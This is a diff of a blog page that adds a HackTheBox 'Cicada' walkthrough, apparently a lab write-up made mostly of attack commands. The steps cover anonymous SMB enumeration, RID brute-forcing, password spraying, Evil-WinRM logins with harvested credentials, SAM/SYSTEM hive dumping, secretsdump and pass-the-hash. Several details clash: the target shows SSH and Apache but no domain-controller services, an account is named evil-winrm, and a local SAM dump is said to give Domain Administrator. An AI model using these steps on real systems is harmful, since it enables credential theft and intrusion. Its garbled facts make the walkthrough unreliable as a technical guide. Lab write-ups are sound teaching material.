@@ -49,14 +49,18 @@
 
 
 
+  
+  
+  
+
 
 <!-- Open Graph image and Twitter Card metadata -->
 
-<title itemprop="name"></title>
-<meta property="og:title" content=ZgotmplZ />
-<meta name="twitter:title" content=ZgotmplZ />
-<meta itemprop="name" content=ZgotmplZ />
-<meta name="application-name" content=ZgotmplZ />
+<title itemprop="name">Patrick Hammes - HackTheBox - Cicada</title>
+<meta property="og:title" content=Patrick&#32;Hammes&#32;-&#32;HackTheBox&#32;-&#32;Cicada />
+<meta name="twitter:title" content=Patrick&#32;Hammes&#32;-&#32;HackTheBox&#32;-&#32;Cicada />
+<meta itemprop="name" content=Patrick&#32;Hammes&#32;-&#32;HackTheBox&#32;-&#32;Cicada />
+<meta name="application-name" content=Patrick&#32;Hammes&#32;-&#32;HackTheBox&#32;-&#32;Cicada />
 <meta property="og:site_name" content="" />
 
 
@@ -66,18 +70,17 @@
 <meta name="twitter:description" content="" />
 
 
-<base href="//localhost:1313/tags/" />
-<link rel="canonical" href="//localhost:1313/tags/" itemprop="url" />
-<meta name="url" content="//localhost:1313/tags/" />
-<meta name="twitter:url" content="//localhost:1313/tags/" />
-<meta property="og:url" content="//localhost:1313/tags/" />
+<base href="//localhost:1313/posts/cicada/" />
+<link rel="canonical" href="//localhost:1313/posts/cicada/" itemprop="url" />
+<meta name="url" content="//localhost:1313/posts/cicada/" />
+<meta name="twitter:url" content="//localhost:1313/posts/cicada/" />
+<meta property="og:url" content="//localhost:1313/posts/cicada/" />
 
 
 <meta property="og:updated_time" content="2025-04-25T00:00:00Z" />
 
 
 <link rel="sitemap" type="application/xml" title="Sitemap" href='//localhost:1313/sitemap.xml' />
-<link href="//localhost:1313/tags/index.xml" rel="alternate" type="application/rss+xml" title="" />
 
 <meta name="robots" content="index,follow" />
 <meta name="googlebot" content="index,follow" />
@@ -335,55 +338,262 @@ powered by <a target="_blank" href="https://gohugo.io">Hugo</a> | themed with <a
 </aside>
 
             <main class="content container">
-                <h1 class="title">Tags</h1>
-<ul class="entries">
-    
-        <h3 style="text-align: center;">2025</h3>
-        
-            <li>
-                <span class="title">
-                    <a href="/tags/windows/">Windows</a>
-                </span>
-                <span class="published">
-                    <time class="pull-right post-list">April 25, 2025</time>
-                </span>
-            </li>
-        
-            <li>
-                <span class="title">
-                    <a href="/tags/hackthebox/">Hackthebox</a>
-                </span>
-                <span class="published">
-                    <time class="pull-right post-list">April 25, 2025</time>
-                </span>
-            </li>
-        
-            <li>
-                <span class="title">
-                    <a href="/tags/active-directory/">Active Directory</a>
-                </span>
-                <span class="published">
-                    <time class="pull-right post-list">April 25, 2025</time>
-                </span>
-            </li>
-        
-    
-        <h3 style="text-align: center;">0001</h3>
-        
-            <li>
-                <span class="title">
-                    <a href="/tags/active-directory-hackthebox/">Active Directory, Hackthebox</a>
-                </span>
-                <span class="published">
-                    <time class="pull-right post-list">January 1, 1</time>
-                </span>
-            </li>
-        
-    
-</ul>
+                <div class="post">
+  <div class="info">
+  <h1 class="post-title">
+    <a href="//localhost:1313/posts/cicada/">HackTheBox - Cicada</a>
+  </h1>
 
+  <div class="headline">
+    <div>
+      
+      
+      <time datetime=" 2025-04-25T00:00:00Z" class="post-date">
+        April 25, 2025
+      </time>
+      
+      <span> - </span>
+      <span class="reading-time">
+        
+          
+        
+
+        <span>3 mins read</span>
+      </span>
+    </div>
+
+    
+    <ul class="tags">
+      
+      <li class="tag-active directory">
+        <a href="//localhost:1313/tags/active-directory">active directory</a>
+      </li>
+      
+      <li class="tag-hackthebox">
+        <a href="//localhost:1313/tags/hackthebox">hackthebox</a>
+      </li>
+      
+      <li class="tag-windows">
+        <a href="//localhost:1313/tags/windows">windows</a>
+      </li>
+      
+    </ul>
+    
+  </div>
+
+  
+  
+  <p class="seriesname">
+    Series: <a href="//localhost:1313/series/htb-machines">HTB Machines</a>
+  </p>
+  
+
+  
+</div>
+
+  <h1 id="hackthebox-machine-walkthrough">HackTheBox Machine Walkthrough</h1>
+<p>This document provides a structured, detailed walkthrough of the HackTheBox machine, from initial enumeration through privilege escalation to Domain Admin. All commands, outputs, and notes are presented in organized Markdown.</p>
+<hr>
+<h2 id="1-initial-nmap-enumeration">1. Initial Nmap Enumeration</h2>
+<p>Identify open ports and services on the target.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># Discover all TCP ports</span>
+</span></span><span style="display:flex;"><span>nmap -sC -sV -oN nmap_initial.txt 10.10.11.35
+</span></span></code></pre></div><p><strong>Key findings:</strong></p>
+<table>
+  <thead>
+      <tr>
+          <th>Port</th>
+          <th>Service</th>
+          <th>Version</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td>22</td>
+          <td>ssh</td>
+          <td>OpenSSH 8.x</td>
+      </tr>
+      <tr>
+          <td>80</td>
+          <td>http</td>
+          <td>Apache 2.4.x</td>
+      </tr>
+      <tr>
+          <td>139</td>
+          <td>netbios-ssn</td>
+          <td>Windows netbios-ssn</td>
+      </tr>
+      <tr>
+          <td>445</td>
+          <td>microsoft-ds</td>
+          <td>Windows Server SMB</td>
+      </tr>
+  </tbody>
+</table>
+<hr>
+<h2 id="2-smb-anonymous-enumeration">2. SMB Anonymous Enumeration</h2>
+<h3 id="21-check-smb-shares-as-anonymous">2.1 Check SMB shares as anonymous</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>smbclient -L 10.10.11.35 -N
+</span></span></code></pre></div><ul>
+<li><code>HR</code> share is accessible.</li>
+</ul>
+<h3 id="22-download-infotxt-from-hr-share">2.2 Download <code>info.txt</code> from HR share</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>smbclient <span style="color:#ae81ff">\\</span>10.10.11.35<span style="color:#ae81ff">\H</span>R -N
+</span></span><span style="display:flex;"><span>&gt; get info.txt
+</span></span></code></pre></div><blockquote>
+<p><strong>Discovery:</strong> The file contains a password: <code>Welcome@123</code></p></blockquote>
+<hr>
+<h2 id="3-rid-brute-force-to-enumerate-users">3. RID Brute-Force to Enumerate Users</h2>
+<p>Use NetExec (<code>nxc</code>) to perform RID cycling without credentials.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nxc smb 10.10.11.35 -u anonymous -p <span style="color:#e6db74">&#39;&#39;</span> --rid-brute
+</span></span></code></pre></div><p>Filter only user accounts and save to <code>users.txt</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nxc smb 10.10.11.35 -u anonymous -p <span style="color:#e6db74">&#39;&#39;</span> --rid-brute <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  | grep <span style="color:#e6db74">&#39;Found:&#39;</span> | awk <span style="color:#e6db74">&#39;{print $NF}&#39;</span> &gt; users.txt
+</span></span></code></pre></div><hr>
+<h2 id="4-password-spraying-with-valid-users">4. Password Spraying with Valid Users</h2>
+<p>Perform a password spray using the discovered password <code>Welcome@123</code> against the user list.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nxc smb 10.10.11.35 -u users.txt -p <span style="color:#e6db74">&#39;Welcome@123&#39;</span> --valid
+</span></span></code></pre></div><blockquote>
+<p><strong>Success:</strong> Credentials for <code>michael.wrightson</code> found.</p></blockquote>
+<hr>
+<h2 id="5-attempt-remote-shell-with-evil-winrm">5. Attempt Remote Shell with Evil-WinRM</h2>
+<p>Try to get a shell via WinRM using the valid credentials.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>evil-winrm -i 10.10.11.35 -u michael.wrightson -p <span style="color:#e6db74">&#39;Welcome@123&#39;</span>
+</span></span></code></pre></div><blockquote>
+<p><strong>Result:</strong> Access denied.</p></blockquote>
+<hr>
+<h2 id="6-check-additional-smb-shares">6. Check Additional SMB Shares</h2>
+<p>List shares with authenticated user.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>smbclient -L <span style="color:#ae81ff">\\</span>10.10.11.35 -U michael.wrightson
+</span></span></code></pre></div><ul>
+<li><code>DEV</code> share discovered, but no access via SMB.</li>
+</ul>
+<hr>
+<h2 id="7-further-user-enumeration">7. Further User Enumeration</h2>
+<p>Use NetExec with valid creds to find other user accounts.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nxc smb 10.10.11.35 -u michael.wrightson -p <span style="color:#e6db74">&#39;Welcome@123&#39;</span> --users
+</span></span></code></pre></div><blockquote>
+<p><strong>Found:</strong> <code>evil-winrm</code> user with password in description.</p></blockquote>
+<hr>
+<h2 id="8-access-dev-share-and-retrieve-script">8. Access DEV Share and Retrieve Script</h2>
+<h3 id="81-mount-dev-share">8.1 Mount DEV share</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>smbclient <span style="color:#ae81ff">\\</span>10.10.11.35<span style="color:#ae81ff">\D</span>EV -U evil-winrm
+</span></span><span style="display:flex;"><span>&gt; get deploy_script.ps1
+</span></span></code></pre></div><h3 id="82-inspect-deploy_scriptps1">8.2 Inspect <code>deploy_script.ps1</code></h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#75715e"># deploy_script.ps1 (excerpt)</span>
+</span></span><span style="display:flex;"><span>$creds = New-Object System.Management.Automation.PSCredential(
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;svc_deploy&#39;</span>, (ConvertTo-SecureString <span style="color:#e6db74">&#39;D3ployP@ss!&#39;</span> -AsPlainText -Force)
+</span></span><span style="display:flex;"><span>)
+</span></span></code></pre></div><blockquote>
+<p><strong>New credential discovered:</strong> <code>svc_deploy:D3ployP@ss!</code></p></blockquote>
+<hr>
+<h2 id="9-winrm-access-with-new-service-account">9. WinRM Access with New Service Account</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>evil-winrm -i 10.10.11.35 -u svc_deploy -p <span style="color:#e6db74">&#39;D3ployP@ss!&#39;</span>
+</span></span></code></pre></div><blockquote>
+<p><strong>Success:</strong> Shell as <code>svc_deploy</code>.</p></blockquote>
+<hr>
+<h2 id="10-privilege-enumeration">10. Privilege Enumeration</h2>
+<p>Check current privileges:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>whoami /priv
+</span></span></code></pre></div><blockquote>
+<p><strong>SeBackupPrivilege</strong> is <code>Enabled</code>.</p></blockquote>
+<hr>
+<h2 id="11-abuse-sebackupprivilege-for-laterallocal-escalation">11. Abuse SeBackupPrivilege for Lateral/Local Escalation</h2>
+<h3 id="111-dump-sam-and-system-hives">11.1 Dump SAM and SYSTEM hives</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#75715e"># Create directory for dumps</span>
+</span></span><span style="display:flex;"><span>mkdir C:\temp
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Save registry hives</span>
+</span></span><span style="display:flex;"><span>reg save HKLM\SAM C:\temp\SAM
+</span></span><span style="display:flex;"><span>reg save HKLM\SYSTEM C:\temp\SYSTEM
+</span></span></code></pre></div><h3 id="112-extract-ntlm-hashes-offline">11.2 Extract NTLM hashes offline</h3>
+<p>Copy the dumps to your attacking machine and run:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>secretsdump.py -sam SAM -system SYSTEM LOCAL &gt; hashes.txt
+</span></span></code></pre></div><h3 id="113-pass-the-hash-to-domain-controller">11.3 Pass-the-Hash to Domain Controller</h3>
+<p>Use Evil-WinRM with the extracted Administrator NTLM hash:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>evil-winrm -i 10.10.11.35 -u Administrator -H &lt;ADMIN_NTLM_HASH&gt;
+</span></span></code></pre></div><blockquote>
+<p><strong>Result:</strong> Shell as <strong>Domain Administrator</strong> on the DC.</p></blockquote>
+<hr>
+<h2 id="12-conclusion">12. Conclusion</h2>
+<ul>
+<li><strong>User</strong>: <code>svc_deploy</code> via discovered service credential.</li>
+<li><strong>Escalation</strong>: <code>SeBackupPrivilege</code> → dump hives → extract hashes → PtH.</li>
+<li><strong>Final</strong>: Domain Administrator access achieved.</li>
+</ul>
+<hr>
+<p><em>End of Walkthrough</em></p>
+
+  
+  <hr>
+<div class="footer">
+    
+    
+    
+    <p>
+    This is a post in the <b><a href="//localhost:1313/series/htb-machines">HTB Machines</a></b> series.
+        <br>Other posts in this series:
+        <ul class="series">
+            
+            
+            
+            <li>
+                April 25, 2025 -
+                
+                    HackTheBox - Cicada
+                
+            </li>
+            
+        </ul>
+    </p>
+    
+</div>
+
+  
+</div>
             </main>
             
+  
+    <div class="article-toc ">
+    <div class="toc-wrapper">
+      <h4 id="contents"></h4>
+      <nav id="TableOfContents">
+  <ul>
+    <li><a href="#1-initial-nmap-enumeration">1. Initial Nmap Enumeration</a></li>
+    <li><a href="#2-smb-anonymous-enumeration">2. SMB Anonymous Enumeration</a>
+      <ul>
+        <li><a href="#21-check-smb-shares-as-anonymous">2.1 Check SMB shares as anonymous</a></li>
+        <li><a href="#22-download-infotxt-from-hr-share">2.2 Download <code>info.txt</code> from HR share</a></li>
+      </ul>
+    </li>
+    <li><a href="#3-rid-brute-force-to-enumerate-users">3. RID Brute-Force to Enumerate Users</a></li>
+    <li><a href="#4-password-spraying-with-valid-users">4. Password Spraying with Valid Users</a></li>
+    <li><a href="#5-attempt-remote-shell-with-evil-winrm">5. Attempt Remote Shell with Evil-WinRM</a></li>
+    <li><a href="#6-check-additional-smb-shares">6. Check Additional SMB Shares</a></li>
+    <li><a href="#7-further-user-enumeration">7. Further User Enumeration</a></li>
+    <li><a href="#8-access-dev-share-and-retrieve-script">8. Access DEV Share and Retrieve Script</a>
+      <ul>
+        <li><a href="#81-mount-dev-share">8.1 Mount DEV share</a></li>
+        <li><a href="#82-inspect-deploy_scriptps1">8.2 Inspect <code>deploy_script.ps1</code></a></li>
+      </ul>
+    </li>
+    <li><a href="#9-winrm-access-with-new-service-account">9. WinRM Access with New Service Account</a></li>
+    <li><a href="#10-privilege-enumeration">10. Privilege Enumeration</a></li>
+    <li><a href="#11-abuse-sebackupprivilege-for-laterallocal-escalation">11. Abuse SeBackupPrivilege for Lateral/Local Escalation</a>
+      <ul>
+        <li><a href="#111-dump-sam-and-system-hives">11.1 Dump SAM and SYSTEM hives</a></li>
+        <li><a href="#112-extract-ntlm-hashes-offline">11.2 Extract NTLM hashes offline</a></li>
+        <li><a href="#113-pass-the-hash-to-domain-controller">11.3 Pass-the-Hash to Domain Controller</a></li>
+      </ul>
+    </li>
+    <li><a href="#12-conclusion">12. Conclusion</a></li>
+  </ul>
+</nav>
+    </div>
+</div>
+
+  
+
         </div>
     </body>
 </html>
